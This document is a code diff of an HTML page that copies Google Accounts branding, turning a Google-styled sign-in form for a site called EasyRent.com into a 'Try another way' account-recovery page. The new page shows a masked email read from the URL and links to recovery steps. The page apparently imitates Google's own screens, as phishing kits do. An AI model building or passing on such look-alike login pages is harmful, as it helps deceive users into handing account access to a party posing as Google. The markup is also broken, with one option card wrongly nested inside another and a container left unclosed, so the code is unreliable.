@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Sign in - Google Accounts</title>
+    <title>Try Another Way - Google Accounts</title>
     <style>
       body {
         font-family: "Google Sans", Arial, sans-serif;
@@ -36,7 +36,6 @@
         font-size: 24px;
         font-weight: 400;
         margin-bottom: 16px;
-        color: #202124;
       }
 
       .subtitle {
@@ -45,51 +44,46 @@
         margin-bottom: 24px;
       }
 
-      .input-container {
-        margin-bottom: 24px;
-        text-align: left;
-      }
-
-      .input-field {
-        width: 100%;
-        padding: 13px 15px;
+      .email-display {
         font-size: 16px;
-        border: 1px solid #dadce0;
+        font-weight: 500;
+        margin-bottom: 24px;
+        padding: 12px;
+        background-color: #f8f9fa;
         border-radius: 4px;
-        box-sizing: border-box;
       }
 
-      .input-field:focus {
-        border-color: #6388e6;
-        outline: none;
-        box-shadow: 0 0 0 2px #e8f0fe;
+      .recovery-options {
+        text-align: left;
+        margin-bottom: 24px;
       }
 
-      .input-label {
-        display: block;
+      .option-card {
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 16px;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .option-card:hover {
+        background-color: #f7f8f8;
+      }
+
+      .option-title {
+        font-weight: 500;
+        font-size: 16px;
+        margin-bottom: 8px;
+        color: #1a73e8;
+      }
+
+      .option-description {
         color: #5f6368;
         font-size: 14px;
-        margin-bottom: 8px;
       }
 
-      .next-btn {
-        background-color: #6388e6;
-        color: white;
-        border: none;
-        border-radius: 4px;
-        padding: 10px 24px;
-        font-size: 14px;
-        font-weight: 500;
-        cursor: pointer;
-        width: 100%;
-        height: 40px;
-      }
-
-      .next-btn:hover {
-        background-color: #1765cc;
-      }
-
-      .create-account {
+      .back-to-code {
         color: #1a73e8;
         font-weight: 500;
         margin-top: 16px;
@@ -97,7 +91,7 @@
         cursor: pointer;
       }
 
-      .create-account:hover {
+      .back-to-code:hover {
         text-decoration: underline;
       }
 
@@ -124,18 +118,6 @@
 
       .footer-links a:hover {
         text-decoration: underline;
-      }
-      .footer-content {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-wrap: wrap;
-        gap: 24px;
-      }
-
-      .language-selector {
-        color: #5f6368;
-        margin-top: 16px;
       }
 
       .language-selector {
@@ -189,59 +171,54 @@
   <body>
     <div class="container">
       <div class="logo">
-        <svg
-          xmlns="http://www.w3.org/2000/svg"
-          viewBox="0 0 272 92"
-          width="75"
-          height="24"
+        <img
+          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+          alt="Google Logo"
+          width="110"
+          height="50"
+        />
+      </div>
+      <h1>Try another way</h1>
+      <div class="subtitle">
+        Choose how you want to get back into your account
+      </div>
+
+      <div class="email-display" id="displayEmail">r*******n@gmail.com</div>
+
+      <div class="recovery-options">
+        <div
+          class="option-card"
+          onclick="location.href='send-recovery-email.html'"
         >
-          <path
-            d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
-            fill="#EA4335"
-          />
-          <path
-            d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"
-            fill="#FBBC05"
-          />
-          <path
-            d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"
-            fill="#4285F4"
-          />
-          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853" />
-          <path
-            d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"
-            fill="#EA4335"
-          />
-          <path
-            d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 54.3.36 39 .36 23.7 16.32 8.65 32.35 8.65 39c0 6.66 5.96 15.71 14.85 23.2 9.82 8.23 18.8 8.23 22.01 8.23 6.3 0 10.75-1.01 15.45-3.06 5.03-2.3 9.41-5.71 12.66-10.75l-13.51-8.73c-3.27 4.79-6.72 7.06-11.51 7.06-3.44 0-6.14-1.26-8.23-3.44-1.72-1.93-2.77-4.37-3.19-7.38h39.47l-.24-2.5z"
-            fill="#4285F4"
-          />
-        </svg>
-      </div>
-
-      <h1>Sign in</h1>
-      <div class="subtitle">to continue to EasyRent.com</div>
-
-      <div class="input-container">
-        <label class="input-label">Email or phone</label>
-        <input type="text" class="input-field" id="email" autofocus />
-      </div>
-
-      <button class="next-btn" onclick="window.location.href='next.html'">
-        Next
-      </button>
-
-      <div class="create-account">Create account</div>
-    </div>
-
-    <div class="footer">
-      <div class="footer-content">
-        <div class="footer-links">
-          <a href="#" id="help-link">Help</a>
-          <a href="#" id="privacy-link">Privacy</a>
-          <a href="#" id="terms-link">Terms</a>
+          <div class="option-title">Send a verification email</div>
+          <div class="option-description">
+            Get a verification code sent to your recovery email
+          </div>
         </div>
 
+        <div
+          class="option-card"
+          onclick="location.href='answer-questions.html'"
+        >
+          <div
+            class="option-card"
+            onclick="location.href='recovery-phone.html'"
+          >
+            <div class="option-title">Get a text message</div>
+            <div class="option-description">
+              Send a code to your recovery phone number
+            </div>
+          </div>
+        </div>
+
+      
+
+      <div class="footer">
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
         <div class="language-selector">
           <button class="language-btn" id="current-language">
             English (United States)
@@ -379,34 +356,22 @@
         document.documentElement.lang = lang;
       }
 
-      // Focus the email field on page load
-      document.getElementById("email").focus();
+      // Get email from URL parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get("email") || "recoveryemail@gmail.com";
 
-      // Handle Next button click
-      document
-        .querySelector(".next-btn")
-        .addEventListener("click", function () {
-          const email = document.getElementById("email").value;
-          if (email) {
-            console.log("Proceeding with email:", email);
-            // Add your authentication logic here
-          } else {
-            alert("Please enter an email address");
-          }
-        });
+      // Display masked email
+      document.getElementById("displayEmail").textContent = maskEmail(email);
 
-      // Handle Create account click
-      document
-        .querySelector(".create-account")
-        .addEventListener("click", function () {
-          console.log("Redirecting to account creation");
-          // Add your account creation logic here
-        });
-
-      // Close dropdown when clicking outside
-      document.addEventListener("click", () => {
-        languageDropdown.classList.remove("show");
-      });
+      // Helper function to mask email
+      function maskEmail(email) {
+        const [username, domain] = email.split("@");
+        const maskedUsername =
+          username.charAt(0) +
+          "*".repeat(username.length - 2) +
+          username.charAt(username.length - 1);
+        return maskedUsername + "@" + domain;
+      }
     </script>
   </body>
 </html>
